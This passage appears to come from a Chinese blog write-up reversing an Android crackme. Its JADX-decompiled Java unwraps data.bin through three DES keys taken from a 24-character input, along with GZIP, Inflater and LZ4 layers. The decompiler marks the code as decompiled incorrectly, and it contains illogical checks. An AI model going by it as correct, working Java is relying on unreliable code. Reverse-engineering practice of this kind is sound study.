<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">View$OnClickListenerC1003a</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">        <span class="keyword">public</span> View$OnClickListenerC1003a() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* JADX WARN: Removed duplicated region for block: B:34:0x00af  */</span></span><br><span class="line">        <span class="comment">/* JADX WARN: Removed duplicated region for block: B:36:0x00bb  */</span></span><br><span class="line">        <span class="comment">/* JADX WARN: Removed duplicated region for block: B:76:0x0143  */</span></span><br><span class="line">        <span class="comment">/* JADX WARN: Removed duplicated region for block: B:78:0x014f  */</span></span><br><span class="line">        <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Code decompiled incorrectly, please refer to instructions dump.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bArr;</span><br><span class="line">            <span class="type">byte</span>[] bArr2;</span><br><span class="line">            <span class="type">byte</span>[] byteArray;</span><br><span class="line">            <span class="type">byte</span>[] bArr3;</span><br><span class="line">            <span class="type">byte</span>[] byteArray2;</span><br><span class="line">            <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.f3918o.getText().toString();</span><br><span class="line">            <span class="keyword">if</span> (obj.length() != <span class="number">24</span>) &#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;Nono, try again please&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] bytes = obj.getBytes();</span><br><span class="line">            <span class="type">byte</span>[] bArr4 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">DataInputStream</span> <span class="variable">dataInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(MainActivity.<span class="built_in">this</span>.getAssets().open(<span class="string">&quot;data.bin&quot;</span>));</span><br><span class="line">                <span class="type">byte</span>[] bArr5 = <span class="keyword">new</span> <span class="title class_">byte</span>[dataInputStream.available()];</span><br><span class="line">                dataInputStream.readFully(bArr5);</span><br><span class="line">                System.arraycopy(bytes, <span class="number">0</span>, bArr4, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bArr6 = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">GZIPInputStream</span> <span class="variable">gZIPInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bArr5));</span><br><span class="line">                    <span class="type">byte</span>[] bArr7 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> gZIPInputStream.read(bArr7);</span><br><span class="line">                        <span class="keyword">if</span> (read &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        byteArrayOutputStream.write(bArr7, <span class="number">0</span>, read);</span><br><span class="line">                    &#125;</span><br><span class="line">                    byteArray2 = byteArrayOutputStream.toByteArray();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException unused) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (byteArray2.length &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="type">byte</span>[] bArr8 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">                    System.arraycopy(byteArray2, <span class="number">0</span>, bArr8, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                    <span class="type">byte</span>[] bArr9 = <span class="keyword">new</span> <span class="title class_">byte</span>[byteArray2.length - <span class="number">8</span>];</span><br><span class="line">                    System.arraycopy(byteArray2, <span class="number">8</span>, bArr9, <span class="number">0</span>, byteArray2.length - <span class="number">8</span>);</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.equals(bArr8, bArr4)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                            cipher.init(<span class="number">2</span>, C0766a.m422j(bArr4));</span><br><span class="line">                            bArr = cipher.doFinal(bArr9);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InvalidKeyException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e2) &#123;</span><br><span class="line">                            e2.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (BadPaddingException e3) &#123;</span><br><span class="line">                            e3.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e4) &#123;</span><br><span class="line">                            e4.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchPaddingException e5) &#123;</span><br><span class="line">                            e5.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (bArr != <span class="literal">null</span>) &#123;</span><br><span class="line">                            Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;The first step incorrect, try again please&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        System.arraycopy(bytes, <span class="number">8</span>, bArr4, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                        <span class="type">Inflater</span> <span class="variable">inflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inflater</span>();</span><br><span class="line">                        inflater.setInput(bArr);</span><br><span class="line">                        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(bArr.length);</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="type">byte</span>[] bArr10 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                                <span class="keyword">while</span> (!inflater.finished()) &#123;</span><br><span class="line">                                    byteArrayOutputStream2.write(bArr10, <span class="number">0</span>, inflater.inflate(bArr10));</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    byteArrayOutputStream2.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IOException e6) &#123;</span><br><span class="line">                                    e6.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                                inflater.end();</span><br><span class="line">                                byteArray = byteArrayOutputStream2.toByteArray();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    byteArrayOutputStream2.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IOException e7) &#123;</span><br><span class="line">                                    e7.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">throw</span> th;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e8) &#123;</span><br><span class="line">                            e8.printStackTrace();</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                byteArrayOutputStream2.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (IOException e9) &#123;</span><br><span class="line">                                e9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (byteArray.length &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                            <span class="type">byte</span>[] bArr11 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">                            System.arraycopy(byteArray, <span class="number">0</span>, bArr11, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                            <span class="type">byte</span>[] bArr12 = <span class="keyword">new</span> <span class="title class_">byte</span>[byteArray.length - <span class="number">8</span>];</span><br><span class="line">                            System.arraycopy(byteArray, <span class="number">8</span>, bArr12, <span class="number">0</span>, byteArray.length - <span class="number">8</span>);</span><br><span class="line">                            <span class="keyword">if</span> (Arrays.equals(bArr11, bArr4)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="type">Cipher</span> <span class="variable">cipher2</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                                    cipher2.init(<span class="number">2</span>, C0766a.m422j(bArr4));</span><br><span class="line">                                    bArr3 = cipher2.doFinal(bArr12);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidKeyException e10) &#123;</span><br><span class="line">                                    e10.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e11) &#123;</span><br><span class="line">                                    e11.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (BadPaddingException e12) &#123;</span><br><span class="line">                                    e12.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e13) &#123;</span><br><span class="line">                                    e13.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (NoSuchPaddingException e14) &#123;</span><br><span class="line">                                    e14.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                bArr2 = bArr3;</span><br><span class="line">                                <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;The first step has been taken, try again please&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                                    <span class="keyword">return</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                System.arraycopy(bytes, <span class="number">16</span>, bArr4, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                                <span class="type">LZ4SafeDecompressor</span> <span class="variable">safeDecompressor</span> <span class="operator">=</span> LZ4Factory.safeInstance().safeDecompressor();</span><br><span class="line">                                <span class="type">byte</span>[] bArr13 = <span class="keyword">new</span> <span class="title class_">byte</span>[bArr2.length * <span class="number">5</span>];</span><br><span class="line">                                <span class="type">int</span> <span class="variable">decompress</span> <span class="operator">=</span> safeDecompressor.decompress(bArr2, <span class="number">0</span>, bArr2.length, bArr13, <span class="number">0</span>);</span><br><span class="line">                                <span class="type">byte</span>[] bArr14 = <span class="keyword">new</span> <span class="title class_">byte</span>[decompress];</span><br><span class="line">                                System.arraycopy(bArr13, <span class="number">0</span>, bArr14, <span class="number">0</span>, decompress);</span><br><span class="line">                                <span class="keyword">if</span> (decompress &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                                    <span class="type">byte</span>[] bArr15 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">                                    System.arraycopy(bArr14, <span class="number">0</span>, bArr15, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> decompress - <span class="number">8</span>;</span><br><span class="line">                                    <span class="type">byte</span>[] bArr16 = <span class="keyword">new</span> <span class="title class_">byte</span>[i];</span><br><span class="line">                                    System.arraycopy(bArr14, <span class="number">8</span>, bArr16, <span class="number">0</span>, i);</span><br><span class="line">                                    <span class="keyword">if</span> (Arrays.equals(bArr15, bArr4)) &#123;</span><br><span class="line">                                        <span class="keyword">try</span> &#123;</span><br><span class="line">                                            <span class="type">Cipher</span> <span class="variable">cipher3</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                                            cipher3.init(<span class="number">2</span>, C0766a.m422j(bArr4));</span><br><span class="line">                                            bArr6 = cipher3.doFinal(bArr16);</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (InvalidKeyException e15) &#123;</span><br><span class="line">                                            e15.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e16) &#123;</span><br><span class="line">                                            e16.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (BadPaddingException e17) &#123;</span><br><span class="line">                                            e17.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e18) &#123;</span><br><span class="line">                                            e18.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (NoSuchPaddingException e19) &#123;</span><br><span class="line">                                            e19.printStackTrace();</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">                                <span class="keyword">if</span> (bArr6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    Toast.makeText(mainActivity, <span class="string">&quot;Almost succeeded, try again please&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                                    <span class="keyword">return</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                Toast.makeText(mainActivity, <span class="string">&quot;Each step is correct, Congs!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                                MainActivity.<span class="built_in">this</span>.f3919p.setImageBitmap(BitmapFactory.decodeByteArray(bArr6, <span class="number">0</span>, bArr6.length));</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        bArr2 = <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                bArr = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (bArr != <span class="literal">null</span>) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e20) &#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;Get data error&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                e20.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>有一个解压的操作里面有第一个8个字节密钥</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">GZIPInputStream</span> <span class="variable">gZIPInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bArr5));</span><br><span class="line">	<span class="type">byte</span>[] bArr7 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> gZIPInputStream.read(bArr7);</span><br><span class="line">		<span class="keyword">if</span> (read &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">byteArrayOutputStream.write(bArr7, <span class="number">0</span>, read);</span><br><span class="line">&#125;<span class="comment">//直接将解压后的读入输出流中</span></span><br><span class="line">byteArray2 = byteArrayOutputStream.toByteArray();<span class="comment">//将输出流的数据转化为byte数组</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException unused) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>后面跟着一个解密操作和一个Inflater解压缩</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (byteArray2.length &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                    <span class="type">byte</span>[] bArr8 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">                    System.arraycopy(byteArray2, <span class="number">0</span>, bArr8, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                    <span class="type">byte</span>[] bArr9 = <span class="keyword">new</span> <span class="title class_">byte</span>[byteArray2.length - <span class="number">8</span>];</span><br><span class="line">                    System.arraycopy(byteArray2, <span class="number">8</span>, bArr9, <span class="number">0</span>, byteArray2.length - <span class="number">8</span>);</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.equals(bArr8, bArr4)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                            cipher.init(<span class="number">2</span>, C0766a.m422j(bArr4));</span><br><span class="line">                            bArr = cipher.doFinal(bArr9);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InvalidKeyException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e2) &#123;</span><br><span class="line">                            e2.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (BadPaddingException e3) &#123;</span><br><span class="line">                            e3.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e4) &#123;</span><br><span class="line">                            e4.printStackTrace();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (NoSuchPaddingException e5) &#123;</span><br><span class="line">                            e5.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (bArr != <span class="literal">null</span>) &#123;</span><br><span class="line">                            Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;The first step incorrect, try again please&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;<span class="comment">//不知道为啥此处会校验bArr是否不等于null，解密成功才会进入？这样不符合逻辑了</span></span><br><span class="line">                        System.arraycopy(bytes, <span class="number">8</span>, bArr4, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                        <span class="type">Inflater</span> <span class="variable">inflater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Inflater</span>();</span><br><span class="line">                        inflater.setInput(bArr);</span><br><span class="line">                        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(bArr.length);</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="type">byte</span>[] bArr10 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                                <span class="keyword">while</span> (!inflater.finished()) &#123;</span><br><span class="line">                                    byteArrayOutputStream2.write(bArr10, <span class="number">0</span>, inflater.inflate(bArr10));</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    byteArrayOutputStream2.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IOException e6) &#123;</span><br><span class="line">                                    e6.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                                inflater.end();</span><br><span class="line">                                byteArray = byteArrayOutputStream2.toByteArray();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    byteArrayOutputStream2.close();</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IOException e7) &#123;</span><br><span class="line">                                    e7.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">throw</span> th;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e8) &#123;</span><br><span class="line">                            e8.printStackTrace();</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                byteArrayOutputStream2.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (IOException e9) &#123;</span><br><span class="line">                                e9.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>又跟了一个解密这次是中间的8个字节密钥</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (byteArray.length &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                            <span class="type">byte</span>[] bArr11 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">                            System.arraycopy(byteArray, <span class="number">0</span>, bArr11, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                            <span class="type">byte</span>[] bArr12 = <span class="keyword">new</span> <span class="title class_">byte</span>[byteArray.length - <span class="number">8</span>];</span><br><span class="line">                            System.arraycopy(byteArray, <span class="number">8</span>, bArr12, <span class="number">0</span>, byteArray.length - <span class="number">8</span>);</span><br><span class="line">                            <span class="keyword">if</span> (Arrays.equals(bArr11, bArr4)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    <span class="type">Cipher</span> <span class="variable">cipher2</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                                    cipher2.init(<span class="number">2</span>, C0766a.m422j(bArr4));</span><br><span class="line">                                    bArr3 = cipher2.doFinal(bArr12);</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidKeyException e10) &#123;</span><br><span class="line">                                    e10.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e11) &#123;</span><br><span class="line">                                    e11.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (BadPaddingException e12) &#123;</span><br><span class="line">                                    e12.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e13) &#123;</span><br><span class="line">                                    e13.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (NoSuchPaddingException e14) &#123;</span><br><span class="line">                                    e14.printStackTrace();</span><br><span class="line">                                    bArr3 = <span class="literal">null</span>;</span><br><span class="line">                                    bArr2 = bArr3;</span><br><span class="line">                                    <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                bArr2 = bArr3;</span><br><span class="line">                                <span class="keyword">if</span> (bArr2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;The first step has been taken, try again please&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                                    <span class="keyword">return</span>;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>最后有最后的8个密钥和一个LZ4解压缩（IDEA抽风了，包下了半天才出来）</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">System.arraycopy(bytes, <span class="number">16</span>, bArr4, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                                <span class="type">LZ4SafeDecompressor</span> <span class="variable">safeDecompressor</span> <span class="operator">=</span> LZ4Factory.safeInstance().safeDecompressor();</span><br><span class="line">                                <span class="type">byte</span>[] bArr13 = <span class="keyword">new</span> <span class="title class_">byte</span>[bArr2.length * <span class="number">5</span>];</span><br><span class="line">                                <span class="type">int</span> <span class="variable">decompress</span> <span class="operator">=</span> safeDecompressor.decompress(bArr2, <span class="number">0</span>, bArr2.length, bArr13, <span class="number">0</span>);</span><br><span class="line">                                <span class="type">byte</span>[] bArr14 = <span class="keyword">new</span> <span class="title class_">byte</span>[decompress];</span><br><span class="line">                                System.arraycopy(bArr13, <span class="number">0</span>, bArr14, <span class="number">0</span>, decompress);</span><br><span class="line">                                <span class="keyword">if</span> (decompress &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                                    <span class="type">byte</span>[] bArr15 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8</span>];</span><br><span class="line">                                    System.arraycopy(bArr14, <span class="number">0</span>, bArr15, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">                                    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> decompress - <span class="number">8</span>;</span><br><span class="line">                                    <span class="type">byte</span>[] bArr16 = <span class="keyword">new</span> <span class="title class_">byte</span>[i];</span><br><span class="line">                                    System.arraycopy(bArr14, <span class="number">8</span>, bArr16, <span class="number">0</span>, i);</span><br><span class="line">                                    <span class="keyword">if</span> (Arrays.equals(bArr15, bArr4)) &#123;</span><br><span class="line">                                        <span class="keyword">try</span> &#123;</span><br><span class="line">                                            <span class="type">Cipher</span> <span class="variable">cipher3</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">                                            cipher3.init(<span class="number">2</span>, C0766a.m422j(bArr4));</span><br><span class="line">                                            bArr6 = cipher3.doFinal(bArr16);</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (InvalidKeyException e15) &#123;</span><br><span class="line">                                            e15.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e16) &#123;</span><br><span class="line">                                            e16.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (BadPaddingException e17) &#123;</span><br><span class="line">                                            e17.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException e18) &#123;</span><br><span class="line">                                            e18.printStackTrace();</span><br><span class="line">                                        &#125; <span class="keyword">catch</span> (NoSuchPaddingException e19) &#123;</span><br><span class="line">                                            e19.printStackTrace();</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">                                <span class="keyword">if</span> (bArr6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                                    Toast.makeText(mainActivity, <span class="string">&quot;Almost succeeded, try again please&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                                    <span class="keyword">return</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                Toast.makeText(mainActivity, <span class="string">&quot;Each step is correct, Congs!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                                